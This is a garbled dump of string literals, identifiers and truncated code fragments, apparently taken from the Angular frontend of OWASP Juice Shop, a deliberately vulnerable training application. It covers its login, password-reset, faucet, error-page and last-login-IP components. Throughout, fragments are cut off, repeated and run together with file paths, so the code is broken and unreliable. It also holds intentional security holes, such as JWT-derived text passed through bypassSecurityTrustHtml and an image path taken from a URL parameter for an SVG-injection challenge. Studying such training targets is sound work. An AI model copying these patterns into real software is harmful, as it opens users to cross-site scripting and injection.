different stickers on the delivery box image// "For ... x image'app-deluxe-user''./deluxe-user.component.html''./deluxe-user.component.scss''assets/public/images/JuiceShop_Logo.png'decalParamsnapshottestDecal'http'`assets/public/images/${'verifySvgInjectionChallenge'selecto ... e-user'app-deluxe-user'./delu ... t.html'./deluxe-user.component.html'./delu ... t.scss'./deluxe-user.component.scsspublic  ... e Shop'public  ... go.png''assets ... go.png'assets/public/images/JuiceShop_Logo.pngassets/public/images/JuiceShop_Logoconst d ... stDecaldecalPa ... stDecalthis.ro ... stDecalthis.ro ... yParamsthis.route.snapshotthis.routeconfig. ... on.namethis.ap ... on.namethis.applicationNameconfig. ... on.logolet log ... on.logologo: s ... on.logoif (log ...       }logo.su ...  'http'logo.substring(0, 4)logo.substringlogo =  ... ) + 1))decodeU ... ) + 1))logo.su ... ') + 1)logo.la ... /') + 1logo.la ... Of('/')logo.lastIndexOfthis.lo ...  logo}`this.logoSrc`assets ...  logo}`assets/ ... images/assets/public/images/decalParam || logoif (dec ...       }this.io ... lParam)verifySvgInjectionChallengethis.us ... tatus()this.us ... eStatus(res) = ... \r\n    }this.me ... hipCostthis.membershipCostres.membershipCosterr.error.errorthis.ng ... uxe']))async ( ... luxe'])await t ... luxe'])this.ro ... luxe'])['/paym ... eluxe']private ... edRouteP:/My Drive/Git/juice-shop/frontend/src/app/error-page/error-page.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/error-pagewarn-notification mat-elevation-z6mat-subheading-2mat-display-3fas fa-hand-paperP:/My Drive/Git/juice-shop/frontend/src/app/error-page/error-page.component.spec.ts'./error-page.component''ErrorPageComponent'./error-page.component/error-page[ErrorPageComponent]provide ... edRouteuseValu ... ' } } }{ snaps ... ' } } }snapsho ... OR' } }{ query ... OR' } }queryPa ... RROR' }{ error ... RROR' }error:  ... _ERROR'P:/My Drive/Git/juice-shop/frontend/src/app/error-page/error-page.component.tsfaUserSlashfaHandPaper'app-error-page''./error-page.component.html''./error-page.component.scss'errorKeyerrorMessagelibrary ... dPaper)class E ... \n  }\r\n}selecto ... r-page'app-error-page'./erro ... t.html'./error-page.component.html['./err ... .scss']'./erro ... t.scss'./error-page.component.scssconst e ... s.errorerrorKe ... s.errorthis.ro ... s.errorif (err ... \r\n    }this.tr ... rorKey)(errorM ...       }this.er ... Messagethis.er ... ationIdP:/My Drive/Git/juice-shop/frontend/src/app/faucet/faucet.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/faucethandleAuthhandleAuth()!session'LABEL_NUMBER_OF_BEES''LABEL_ ... F_BEES'LABEL_NUMBER_OF_BEESwithdrawAmountextractBEETokensextractBEETokens()mintButtonDisabledmintNFT()mat-elevation-z6 honeypot-containermint_button{{ nftMintText }}nftMintTexthoneypot-image mat-elevation-z6assets/public/images/HoneyPot.pngmat-elevation-z6 faucet-containerwithdraw-container{{ "BTN_CLAIM_BEES" | translate }}"BTN_CLAIM_BEES""BTN_CL ... anslateBTN_CLAIM_BEESh5{{ errorMessage }}width: 100%faucet-balancemetamask-button{{ userData.address.substring(0, 6) }}userDat ... g(0, 6)userDat ... bstringuserData.address{{
              userData.address.slice(-6)
            }}userDat ... ice(-6)userDat ... s.slice-6{{'FAUCET_BALANCE' | translate}}'FAUCET_BALANCE''FAUCET ... anslateFAUCET_BALANCE{{ BEEBalance }}BEEBalance{{'BEE_BALANCE' | translate}}'BEE_BALANCE''BEE_BA ... anslateBEE_BALANCE{{ myBEEBalance }}myBEEBalancefaucet-imageassets/public/images/BeeOwner.pngP:/My Drive/Git/juice-shop/frontend/src/app/faucet/faucet.component.ts eslint-disable-next-line @typescript-eslint/no-unused-vars// esli ... ed-vars'../Services/keys.service'BeeFaucetABIBeeTokenABI'../../assets/public/ContractABIs'getDefaultProviderBigNumber'ethers'getAccountInjectedConnector'@wagmi/core'autoConnectprovidernftAddress'0x41427790c94E7a592B17ad694eD9c06A02bb9C39'BeeTokenAddress'0x36435796Ca9be2bf150CE0dECc2D8Fab5C4d6E13'BeeFaucetAddress'0x860e3616aD0E0dEDc23352891f3E10C4131EA5BC''app-faucet''./faucet.component.html''./faucet.component.scss'FaucetComponentkeysServicechangeDetectorRefdeployedContractAddresssuccessResponse'Mint the Pot - 1000 BEE'metamaskAddress'NFT_MINT_TEXT_INTRO'translatedStringnftMintListener'chainChanged'handleChainChangedchallengeSolvedStatus'NFT_MINT_TEXT_SUCCESS'fetchMyBeeBalanceWeb3ProvidersignergetSignercontractContractuserAddressbalanceBigNumberWeiPerEthertoNumber'Error fetching BEE balance:'fetchBeeBalancechainId'PLEASE_INSTALL_WEB3_WALLET'connectoraccountchainnetwork'evm''wallet_addEthereumChain''0xaa36a7'chainName'Sepolia Test Network'nativeCurrency'SepoliaETH''ETH'decimalsrpcUrls'https://ethereum-sepolia.blockpi.network/v1/rpc/public'blockExplorerUrls'https://sepolia.etherscan.io/'targetChainId'11155111'currentChainId'PLEASE_CONNECT_TO_SEPOLIA_NETWORK''Should show ethereum chain now''session'amount'PLEASE_CONNECT_WEB3_WALLET'getBalancebalanceEthformatEther'ETH balance:''0.001''Deposit some test ETH from sepoliafaucet.com or any other ETH faucet to initiate transaction.'txwait'BEE tokens extracted successfully''Error extracting BEEs:''NFT_MINT_TEXT_AWAITING_APPROVAL'amountToApproveparseUnits'1000''18'BeeTokenContractapprovalTx'NFT_MINT_TEXT_CONFIRM''NFT_MINT_TEXT_IN_PROGRESS'mintConfirmation3500'NFT minted successfully!''Error minting NFT:'signOut../Services/keys.serviceimport  ... ctABIs''../../ ... ctABIs'../../assets/public/ContractABIs/assets/public/ContractABIsimport  ... ethers'type BigNumberimport  ... i/core'const c ... r()\r\n})client  ... r()\r\n})createC ... r()\r\n}){\r\n  au ... er()\r\n}autoConnect: trueprovide ... vider()getDefaultProvider()const { ...  window{ ether ...  window{ ethereum }const n ... bb9C39'nftAddr ... bb9C39''0x4142 ... bb9C39'0x41427790c94E7a592B17ad694eD9c06A02bb9C39const B ... 4d6E13'BeeToke ... 4d6E13''0x3643 ... 4d6E13'0x36435796Ca9be2bf150CE0dECc2D8Fab5C4d6E13const B ... 1EA5BC'BeeFauc ... 1EA5BC''0x860e ... 1EA5BC'0x860e3616aD0E0dEDc23352891f3E10C4131EA5BCselecto ... faucet'app-faucet'./fauc ... t.html'./faucet.component.html/faucet['./fau ... .scss']'./fauc ... t.scss'./faucet.component.scssconstru ... \n  ) {}userData: objectsession = falsedeploye ... ss = ''deploye ... AddressBEEBalance = 0myBEEBalance = 0withdra ...  = nullsuccess ... = falsemintBut ...  = truechallen ... = falsenftMint ... 00 BEE''Mint t ... 00 BEE'Mint the Pot - 1000 BEEerrorMessage = ''metamaskAddress = ''ngOnIni ... ))\r\n  }this.tr ... INTRO')'NFT_MI ... _INTRO'NFT_MINT_TEXT_INTROthis.nf ... dStringthis.nftMintTextthis.handleAuth()this.handleAuththis.ch ... inted()this.checkNftMintedthis.nf ... tener()this.nftMintListenerwindow. ... (this))window.ethereum.onwindow.ethereumchainChangedthis.ha ... d(this)this.ha ... ed.bindthis.ha ... Changedthis.ke ... \r\n    )this.ke ... bscribethis.ke ... isten()this.ke ... tListenthis.keysServiceconsole ... sponse)(error) ...       }console.error(error)this.ke ... inted()this.ke ... tMintedconst c ... .solvedchallen ... .solvedchallen ... dStatusrespons ... .solvedresponse.data[0]this.mi ... dStatusthis.mi ... isabledthis.ch ... dStatusthis.challengeSolvedthis.tr ... CCESS')'NFT_MI ... UCCESS'NFT_MINT_TEXT_SUCCESSthis.su ... = falsethis.successResponseasync f ...  }\r\n  }const p ... hereum)provide ... hereum)new eth ... hereum)ethers. ... roviderethers.providersconst s ... igner()signer  ... igner()provider.getSigner()provider.getSignerconst c ...       )contrac ...       )new eth ...       )ethers.Contractconst u ... dress()userAdd ... dress()await s ... dress()signer.getAddress()signer.getAddressconst b ... ddress)balance ... ddress)contrac ... ddress)contract.balanceOfconsole ... Number)this.my ... umber()this.myBEEBalancebalance ... umber()balance ... oNumberbalance ... rEther)balance ...    .divethers. ... erEtherethers.constantsthis.my ... eSolvedthis.my ... >= 1000!this.c ... eSolvedthis.mi ... = falsethis.my ... <= 1000this.mi ...  = truecatch ( ... \r\n    }console ...  error)'Error  ... lance:'Error fetching BEE balance:const b ... lance()balance ... lance()await c ... lance()contract.balance()contract.balanceconsole.log(balance)this.BE ... balancethis.BEEBalanceasync h ... ()\r\n  }await t ... eAuth()async h ...  }\r\n  }const { ... count(){ isCon ... count(){ isConnected }getAccount()if (isC ...       }await disconnect()disconnect()if (!wi ...       }!window.ethereum'PLEASE ... WALLET'PLEASE_INSTALL_WEB3_WALLETconst p ... or() })provide ... or() })await c ... or() })connect ... or() }){ conne ... tor() }connect ... ector()new Inj ... ector()this.me ... accountthis.metamaskAddressprovider.accountthis.us ...       }address ... accountchain:  ... hain.idprovider.chain.idprovider.chainnetwork: 'evm'await e ...      })ethereu ...      })ethereum.requestmethod: ... mChain''wallet ... mChain'wallet_addEthereumChainparams: ...       ]chainId: '0xaa36a7'0xaa36a7chainNa ... etwork''Sepoli ... etwork'Sepolia Test NetworknativeC ...       }name: 'SepoliaETH'SepoliaETHsymbol: 'ETH'ETHdecimals: 18rpcUrls ... ublic']['https ... ublic']'https: ... public'https://ethereum-sepolia.blockpi.network/v1/rpc/publichttps://ethereum-sepoliablockpinetwork/v1/rpc/publicblockEx ... n.io/']['https ... n.io/']'https: ... an.io/'https://sepolia.etherscan.io/https://sepoliaetherscanio/const t ... 155111'targetC ... 155111'11155111const c ... in?.id)current ... in?.id)String( ... in?.id)provider.chain?.idprovide ... ChainIdcurrent ... ChainIdthis.session = falsethis.session'PLEASE ... ETWORK'PLEASE_CONNECT_TO_SEPOLIA_NETWORKconsole ... n now')'Should ... in now'Should show ethereum chain nowthis.session = trueawait t ... lance()this.fe ... lance()this.fetchBeeBalancethis.fe ... Balanceconsole ... ession)this.ch ... anges()this.ch ... Changesthis.ch ... ctorRefasync e ...  }\r\n  }this.withdrawAmountif (!th ... \r\n    }!this.sessionPLEASE_CONNECT_WEB3_WALLETawait p ... ddress)provide ... ddress)provider.getBalanceconst b ... Number)balance ... Number)ethers. ... Number)ethers. ... atEtherethers.utilsconsole ... nceEth)ETH balance:typeof balanceEthif (bal ...       }balanceEth < '0.001'0.001this.er ... ction.'this.errorMessage'Deposi ... ction.'Deposit some test ETH from sepoliafaucet.com or any other ETH faucet to initiate transaction.Deposit some test ETH from sepoliafaucetcom or any other ETH faucet to initiate transactionconst t ... amount)tx = aw ... amount)await c ... amount)contrac ... amount)contract.withdrawawait tx.wait()tx.wait()tx.waitconsole ... fully')'BEE to ... sfully'BEE tokens extracted successfullyconsole ... essage)'Error  ...  BEEs:'Error extracting BEEs:error.messagethis.er ... messageasync m ...  }\r\n  }this.tr ... ROVAL')'NFT_MI ... PROVAL'NFT_MINT_TEXT_AWAITING_APPROVALconst a ... , '18')amountT ... , '18')ethers. ... , '18')ethers. ... seUnitsconst B ...       )BeeToke ...       )const a ...       )approva ...       )await B ...       )BeeToke ... approveawait a ... .wait()approvalTx.wait()approvalTx.waitthis.tr ... NFIRM')'NFT_MI ... ONFIRM'NFT_MINT_TEXT_CONFIRMconst c ... signer)contrac ... signer)new eth ... signer)const t ... ntNFT()transac ... ntNFT()await c ... ntNFT()contract.mintNFT()contract.mintNFTconsole ... action)this.tr ... GRESS')'NFT_MI ... OGRESS'NFT_MINT_TEXT_IN_PROGRESSconst m ... .wait()mintCon ... .wait()await t ... .wait()transaction.wait()transaction.waitconsole ... mation)if (min ...       }setTime ... , 3500)this.ke ...       )this.ke ... ddress)this.ke ... TWalletresponse.successthis.su ... .statusconsole ... ully!')'NFT mi ... fully!'NFT minted successfully!Error minting NFT:async s ... se\r\n  }{\r\n     ... se\r\n  }P:/My Drive/Git/juice-shop/frontend/src/app/faucet/faucet.module.tsCommonModule'./faucet.component'forChild./faucet.componentpath: ''@NgModu ... MA]\r\n})NgModul ... MA]\r\n}){\r\n  de ... EMA]\r\n}[FaucetComponent]RouterM ... routes)RouterM ... orChildP:/My Drive/Git/juice-shop/frontend/src/app/feedback-details/feedback-details.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/feedback-detailsdialogActionheight: 0; position: absolute;<!-- 'absorbs' the auto-focus behavior -->margin-top: 10px !important;{{id}}{{"LABEL_USER" | translate}}"LABEL_USER"LABEL_USER{{"LABEL_COMMENT" | translate}}"LABEL_COMMENT"LABEL_COMMENTP:/My Drive/Git/juice-shop/frontend/src/app/feedback-details/feedback-details.component.spec.ts'./feedback-details.component''FeedbackDetailsComponent'productData./feedback-details.component/feedback-details'Feedba ... ponent'[Feedba ... ponent]{ productData: {} }productData: {}P:/My Drive/Git/juice-shop/frontend/src/app/feedback-details/feedback-details.component.ts'app-feedback-details''./feedback-details.component.html''./feedback-details.component.scss'selecto ... etails''app-fe ... etails'app-feedback-details'./feed ... t.html'./feedback-details.component.html['./fee ... .scss']'./feed ... t.scss'./feedback-details.component.scsspublic feedback: anypublic id: anyconstru ... ny) { }ngOnIni ... id\r\n  }this.fe ... eedbackthis.di ... eedbackthis.id ... Data.idthis.idthis.dialogData.idP:/My Drive/Git/juice-shop/frontend/src/app/forgot-password/forgot-password.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/forgot-passwordemailControlsecurityQuestionControlrepeatPasswordControl!emailControl.dirtyemailControl.dirty!securi ... l.dirtysecurit ... l.dirtysecurit ... ControlrepeatP ... l.dirtyrepeatP ... ControlfindSecurityQuestionfindSec ... stion(){{ 'MANDATORY_EMAIL' | translate  }}'MANDATORY_EMAIL'MANDATORY_EMAILemailCo ... equiredemailControl.invalidemailControl.errorsemailCo ... s.email{{ securityQuestion }}{{ 'MANDATORY_SECURITY_ANSWER' | translate  }}'MANDATORY_SECURITY_ANSWER''MANDAT ... ANSWER'MANDATORY_SECURITY_ANSWERsecurit ... equiredsecurit ... invalidsecurit ... .errorspasswor ... equiredpasswor ... .errorsrepeatP ... equiredrepeatP ... invalidrepeatP ... .errorsrepeatP ... notSamerepeatP ... length)(repeat ... length)repeatP ... xlengthrepeatP ... nlengthpasswordStrengthpasswor ... h.colorpasswordInfoTogglepasswor ... checked'LOWER_CASE_CRITERIA_MSG''LOWER_ ... anslate'LOWER_ ... IA_MSG'LOWER_CASE_CRITERIA_MSG'UPPER_CASE_CRITERIA_MSG''UPPER_ ... anslate'UPPER_ ... IA_MSG'UPPER_CASE_CRITERIA_MSG'DIGITS_CRITERIA_MSG''DIGITS ... anslate'DIGITS ... IA_MSG'DIGITS_CRITERIA_MSG'SPECIAL_CHARS_CRITERIA_MSG''SPECIA ... anslate'SPECIA ... IA_MSG'SPECIAL_CHARS_CRITERIA_MSG'MIN_CHARS_CRITERIA_MSG''MIN_CH ... lue: 8}'MIN_CH ... IA_MSG'MIN_CHARS_CRITERIA_MSG{value: 8}value: 8emailCo ... isabledemailCo ... invalidrepeatP ... isabledresetPassword()resetButtonemailControl.invalid || securityQuestionControl.invalid || passwordControl.invalid || repeatPasswordControl.invalid || repeatPasswordControl.disabledButton to confirm the changesforgot-formmat-password-strength-infopasswordInfoToggle.checked[passwordComponent][lowerCaseCriteriaMsg]'LOWER_CASE_CRITERIA_MSG' | translate[upperCaseCriteriaMsg]'UPPER_CASE_CRITERIA_MSG'| translate[digitsCriteriaMsg]'DIGITS_CRITERIA_MSG'| translate[specialCharsCriteriaMsg]'SPECIAL_CHARS_CRITERIA_MSG' | translate[minCharsCriteriaMsg]'MIN_CHARS_CRITERIA_MSG' | translate:{value: 8}mat-password-strengthmat-slide-toggle{{'SHOW_PASSWORD_ADVICE' | translate}}'SHOW_PASSWORD_ADVICE''SHOW_P ... anslate'SHOW_P ... ADVICE'SHOW_PASSWORD_ADVICErepeatPasswordControl.invalid && (repeatPasswordControl?.errors.minlength || repeatPasswordControl?.errors.maxlength)repeatPasswordControl.invalid && repeatPasswordControl.errors.notSamerepeatPasswordControl.invalid && repeatPasswordControl.errors.required{{repeatPassword.value?.length || 0}}repeatPasswordrepeatP ... th || 0repeatP ... .lengthrepeatPassword.valuepasswordControl.invalid && passwordControl.errors.requiredsecurityQuestionControl.invalid && securityQuestionControl.errors.requiredPlease answer your selected security questionsecurityAnswerField for the answer to the security questionemailControl.invalid && emailControl.errors.emailemailControl.invalid && emailControl.errors.requiredPlease enter your email address to proceed(ngModelChange)findSecurityQuestion()Enter your emailEmail address field!(error && !emailControl.dirty && !securityQuestionControl.dirty && !passwordControl.dirty && !repeatPasswordControl.dirty)!(confirmation && !emailControl.dirty && !securityQuestionControl.dirty && !passwordControl.dirty && !repeatPasswordControl.dirty)P:/My Drive/Git/juice-shop/frontend/src/app/forgot-password/forgot-password.component.spec.ts'./forgot-password.component''../Services/security-question.service''src/app/Services/user.service''ForgotPasswordComponent'securityQuestionService'findBy''resetPassword''should be compulsory to fill the email field''should hold a valid email in the email field''a@a''should be compulsory to answer to the security question'timeoutDuration'Answer''should be compulsory to fill the password field''should have a password length of at least five characters''aaa''aaaaa''should allow password length of more than twenty characters''aaaaaaaaaaaaaaaaaaaaa''should be compulsory to repeat the password''should reset form on calling resetForm''security question''repeat password''resetErrorForm'resetErrorForm'should find the security question of a user with a known email address''What is your favorite test tool?''known@user.test''should not find the security question for an email address not bound to a user''unknown@user.test''should not have a security question when lookup by email address failed''some@user.test''should find not attempt to find security question for empty email address'./forgot-password.component/forgot-password../Services/security-question.servicesrc/app/Services/user.servicesrc/app/Services/user'Forgot ... ponent'let sec ... ce: anysecurit ... ce: anysecurit ... Servicesecurit ... ndBy'])jasmine ... ndBy'])['findBy']securit ... of({}))securit ... rnValuesecurit ... dBy.andsecurit ... .findBy['resetPassword'][Forgot ... ponent]'should ...  field'should be compulsory to fill the email fieldshould hold a valid email in the email fieldcompone ... ('a@a')a@a'should ... estion'should be compulsory to answer to the security questiontick(co ... ration)compone ... urationcompone ... nswer')Answerflush()should be compulsory to fill the password fieldshould have a password length of at least five characterscompone ... ('aaa')aaacompone ... aaaaa')aaaaashould allow password length of more than twenty characters'aaaaaa ... aaaaaa'aaaaaaaaaaaaaaaaaaaaashould be compulsory to repeat the passwordcompone ... ue('a')should reset form on calling resetFormcompone ... email')compone ... stion')security questionrepeat passworduserSer ... or' }))spyOn(c ... rForm')expect( ... orForm)compone ... rorFormshould find the security question of a user with a known email addresssecurit ... l?' }))of({ qu ... ol?' }){ quest ... ool?' }questio ...  tool?''What i ...  tool?'What is your favorite test tool?What is your favorite test tool?compone ... .test')known@user.testknown@usercompone ... stion()compone ... uestionexpect( ... tool?')expect( ... estion)'should ... a user'should not find the security question for an email address not bound to a userunknown@user.testunknown@user'should ... failed'should not have a security question when lookup by email address failedsecurit ... rror'))some@user.testsome@usershould find not attempt to find security question for empty email addressexpect( ... By).notexpect( ... findBy)P:/My Drive/Git/juice-shop/frontend/src/app/forgot-password/forgot-password.component.ts'../Models/securityQuestion.model''app-forgot-password''./forgot-password.component.html''./forgot-password.component.scss'../Models/securityQuestion.model/Models/securityQuestiontype Se ... uestion'app-fo ... ssword'app-forgot-password'./forg ... t.html'./forgot-password.component.html['./for ... .scss']'./forg ... t.scss'./forgot-password.component.scsspublic  ... email])new Unt ... email])[Valida ... .email]Validators.email{ disab ... e: '' }public  ...  = 1000private timeoutfindSec ... n)\r\n  }clearTi ... imeout)this.timeoutthis.ti ... ration)setTime ... ration)this.se ... definedthis.se ... uestionthis.em ... l.valuethis.emailControlthis.se ...       )this.se ... bscribethis.se ... .value)this.se ... .findBythis.se ... Service(securi ...       }if (sec ...       }this.se ... nable()this.se ... .enablethis.se ... Controlthis.pa ... nable()this.pa ... .enablethis.re ... nable()this.re ... .enablethis.se ... sable()this.se ... disablethis.pa ... sable()this.pa ... disablethis.re ... sable()this.re ... disablethis.timeoutDurationresetPa ... })\r\n  }email:  ... l.valueanswer: ... l.valuethis.se ... l.valuethis.re ... rForm()this.resetErrorFormthis.em ... lue('')this.em ... etValuethis.em ... stine()this.em ... ristinethis.em ... uched()this.em ... touchedthis.se ... lue('')this.se ... etValuethis.se ... stine()this.se ... ristinethis.se ... uched()this.se ... touchedresetEr ... ()\r\n  }repeatP ... l.valueP:/My Drive/Git/juice-shop/frontend/src/app/last-login-ip/last-login-ip.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/last-login-ipipCard mat-elevation-z6margin-bottom: 15px;P:/My Drive/Git/juice-shop/frontend/src/app/last-login-ip/last-login-ip.component.spec.ts FIXME Expected state seems to leak over from previous test case occasionally// FIXM ... ionally'./last-login-ip.component''LastLoginIpComponent''DomSanitizer''bypassSecurityTrustHtml''sanitize'callFake'should log JWT parsing error to console''definitelyInvalidJWT''should set Last-Login IP from JWT as trusted HTML''eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7Imxhc3RMb2dpbklwIjoiMS4yLjMuNCJ9fQ.RAkmdqwNypuOxv3SDjPO4xMKvd1CddKvDFYDBfUt3bg''<small>1.2.3.4</small>''should not set Last-Login IP if none is present in JWT''eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7fX0.bVBhvll6IaeR3aUdoOeyR8YZe2S2DfhGAxTGfd9enLw'./last-login-ip.component/last-login-ip'LastLo ... ponent'let sanitizersanitiz ... tize'])jasmine ... tize'])['bypas ... itize']'bypass ... stHtml'sanitiz ... > args)sanitiz ... allFakesanitiz ... tml.andsanitiz ... ustHtml(args: any) => argssanitiz ... lue({})sanitiz ... rnValuesanitiz ... ize.andsanitizer.sanitize[LastLo ... ponent]{ provi ... tizer }provide ... nitizeruseValue: sanitizershould log JWT parsing error to consolelocalSt ... idJWT')'defini ... lidJWT'definitelyInvalidJWTxit('sh ... )\r\n  })'should ... d HTML'should set Last-Login IP from JWT as trusted HTML{ // FI ... ')\r\n  }localSt ... Ut3bg')'eyJhbG ... fUt3bg'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7Imxhc3RMb2dpbklwIjoiMS4yLjMuNCJ9fQ.RAkmdqwNypuOxv3SDjPO4xMKvd1CddKvDFYDBfUt3bgeyJkYXRhIjp7Imxhc3RMb2dpbklwIjoiMS4yLjMuNCJ9fQRAkmdqwNypuOxv3SDjPO4xMKvd1CddKvDFYDBfUt3bgexpect( ... mall>')expect( ... stHtml)'<small ... small>'<small>1.2.3.4</small><small>14</small>'should ... in JWT'should not set Last-Login IP if none is present in JWT{ // FI ... ()\r\n  }localSt ... 9enLw')'eyJhbG ... d9enLw'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7fX0.bVBhvll6IaeR3aUdoOeyR8YZe2S2DfhGAxTGfd9enLweyJkYXRhIjp7fX0bVBhvll6IaeR3aUdoOeyR8YZe2S2DfhGAxTGfd9enLwexpect( ... ml).notP:/My Drive/Git/juice-shop/frontend/src/app/last-login-ip/last-login-ip.component.ts'app-last-login-ip''./last-login-ip.component.html''./last-login-ip.component.scss''?'parseAuthToken`<small>${}</small>`@Compon ... ]\r\n\r\n})Compone ... ]\r\n\r\n}){\r\n  se ... ']\r\n\r\n}selecto ... gin-ip'app-last-login-ip'./last ... t.html'./last-login-ip.component.html['./las ... .scss']'./last ... t.scss'./last-login-ip.component.scsslastLog ... y = '?'this.pa ... Token()this.parseAuthTokenparseAu ...  }\r\n  }let pay ...  as anypayload = {} as any{} as anyif (pay ...       }payload ... LoginIpthis.la ... mall>`)this.lastLoginIpthis.sa ... mall>`)`<small ... small>`<small></small>P:/My Drive/Git/juice-shop/frontend/src/app/login/login.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/loginthis.error=nullhide ?  ...  'text'hide = !hide!hide{{ 'SHOW_PWD_TOOLTIP' | translate  }}'SHOW_PWD_TOOLTIP'SHOW_PWD_TOOLTIP{{ 'HIDE_PWD_TOOLTIP' | translate  }}'HIDE_PWD_TOOLTIP''HIDE_P ... anslateHIDE_PWD_TOOLTIP!emailC ... l.value!emailControl.valueemailControl.value!passwo ... l.valuelogin()rememberMeoauthUnavailable!oauthUnavailablegoogleLogingoogleLogin()login-formnewCustomerLinkprimary-link/registerloginButtonGoogleLogin with Googlegoogle-button{{'BTN_GOOGLE_LOGIN' | translate}}'BTN_GOOGLE_LOGIN''BTN_GO ... anslateBTN_GOOGLE_LOGINfab fa-google fa-lgbreakLinetextOnLinemat-checkboxCheckbox to stay logged in or not logged in{{'REMEMBER_ME' | translate}}'REMEMBER_ME''REMEMB ... anslateREMEMBER_MEloginButton!emailControl.value||!passwordControl.valueLogin{{'BTN_LOGIN' | translate}}'BTN_LOGIN''BTN_LO ... anslateBTN_LOGINprimary-link forgot-pwButton to hide the passwordfas fa-eye-slashEye SlashButton to display the passwordEyeP:/My Drive/Git/juice-shop/frontend/src/app/login/login.component.spec.ts'../search-result/search-result.component''./login.component''LoginComponent''should have email as compulsory''Value''should have password as compulsory''should have remember-me checked if email token is present as in localStorage''should have remember-me unchecked if email token is not present in localStorage''should flag OAuth as disabled if server is running on unauthorized redirect URI''forwards to main page after successful login''/search''stores the returned authentication token in localStorage''puts the returned basket id into browser session storage''removes authentication token and basket id on failed login attempt''returns error message from server to client on failed login attempt''sets form to pristine on failed login attempt''puts current email into "email" cookie on successful login with remember-me checkbox ticked''horst@juice-sh.op''puts current email into "email" cookie on failed login with remember-me checkbox ticked''../sea ... ponent'../search-result/search-result.component./login.component/loginlet loc ... ocationlocation: LocationuserSer ... ogin'])jasmine ... ogin'])['login']userSer ... gin.anduserService.login[LoginC ... ponent]locatio ... cation)session ... oveItem'should ... ulsory'should have email as compulsorycompone ... Value')Valueshould have password as compulsoryshould have remember-me checked if email token is present as in localStoragelocalSt ...  'a@a')compone ... e.valuecomponent.rememberMeshould have remember-me unchecked if email token is not present in localStorage'should ... ct URI'should flag OAuth as disabled if server is running on unauthorized redirect URIexpect( ... ilable)compone ... ailableit('for ... \r\n  }))'forwar ...  login'forwards to main page after successful logincomponent.login()component.loginexpect( ... earch')expect( ... path())location.path()location.path/searchit('sto ... )\r\n  })'stores ... torage'stores the returned authentication token in localStorageuserSer ... en' }))of({ to ... ken' }){ token: 'token' }token: 'token'expect( ... token')expect( ... oken'))it('put ... )\r\n  })'puts t ... torage'puts the returned basket id into browser session storageuserSer ... 711 }))of({ bid: 4711 }){ bid: 4711 }bid: 4711expect( ... '4711')expect( ... 'bid'))it('rem ... \r\n  }))'remove ... ttempt'removes authentication token and basket id on failed login attempt'return ... ttempt'returns error message from server to client on failed login attemptit('set ... \r\n  }))'sets f ... ttempt'sets form to pristine on failed login attempt'puts c ... ticked'puts current email into "email" cookie on successful login with remember-me checkbox tickedcompone ... sh.op')horst@juice-sh.ophorst@juice-shcompone ... e(true)expect( ... sh.op')expect( ... mail'))it('put ... \r\n  }))puts current email into "email" cookie on failed login with remember-me checkbox tickedP:/My Drive/Git/juice-shop/frontend/src/app/login/login.component.tsfaEyeSlashfaKeyfaGoogle'../Services/basket.service'oauthProviderUrl'https://accounts.google.com/o/oauth2/v2/auth''app-login''./login.component.html''./login.component.scss''1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com'redirectUribasketService}//${authorizedRedirect' is not an authorized redirect URI for this application.''login-form''loginButton''totp_token_required''/2fa/enter'}?client_id=${}&response_type=token&scope=email&redirect_uri=${../Services/basket.servicelibrary ... Google)const o ... 2/auth'oauthPr ... 2/auth''https: ... 2/auth'https://accounts.google.com/o/oauth2/v2/authhttps://accountsgooglecom/o/oauth2/v2/authselecto ... -login'app-login'./logi ... t.html'./login.component.html['./log ... .scss']'./logi ... t.scss'./login.component.scsspublic  ... th(1)])new Unt ... th(1)])[Valida ... gth(1)]Validat ... ngth(1)public hide = truepublic user: anypublic  ... (false)new Unt ... (false)public  ... nt.com'1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhqappsgoogleusercontentconst e ... email')email = ... email')if (ema ... \r\n    }this.user = {}this.userthis.us ... = emailthis.user.emailthis.re ... e(true)this.rememberMethis.re ... (false)this.re ... .host}`this.redirectUri`${this ... .host}`this.wi ... rotocolthis.wi ... ocation//this.wi ... on.hostconfig? ... leOauththis.cl ... lientIdthis.clientIdconfig. ... lientIdconfig. ... leOauthconst a ... ectUri)authori ... ectUri)config. ... ectUri)config. ... ts.findconfig. ... directsr => r. ... rectUrir.uri = ... rectUrir.uriif (aut ...       }this.oa ... = falsethis.oa ... ailablethis.re ... ect.uriauthori ... ect.uriauthori ... t.proxythis.oa ...  = trueconsole ... tion.')this.re ... ation.'' is no ... ation.' is not an authorized redirect URI for this application.this.fo ... in() })() => { ... gin() }{ this.login() }this.login()this.loginlogin ( ...  }\r\n  }this.user.passwordthis.us ... s.user)this.us ... e.login(authen ... \r\n    }authentication.tokensession ... on.bid)authentication.bidthis.ba ... Items()this.ba ... rtItemsthis.basketServicethis.us ... t(true)this.us ... In.nextthis.us ... oggedInthis.ng ... rch']))async ( ... arch'])await t ... arch'])this.ro ... arch'])['/search']({ erro ... \r\n    }if (err ...       }error.s ... quired'error.s ... or.dataerror.data'totp_t ... quired'totp_token_requiredlocalSt ... pToken)error.data.tmpTokenthis.ng ... ter']))async ( ... nter'])await t ... nter'])this.ro ... nter'])['/2fa/enter']/2fa/enterthis.co ... token')this.us ... (false)this.re ... e.valuelocalSt ... .email)googleL ... `)\r\n  }this.wi ... tUri}`)this.wi ... replace`${oaut ... ctUri}`?client_id=&respon ... ct_uri=&response_type=token&scope=email&redirect_uri=P:/My Drive/Git/juice-shop/frontend/src/app/navbar/navbar.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/navbaronToggleSidenavonToggleSidenav(){{ 'SIDENAV_HINT' | translate }}'SIDENAV_HINT''SIDENA ... 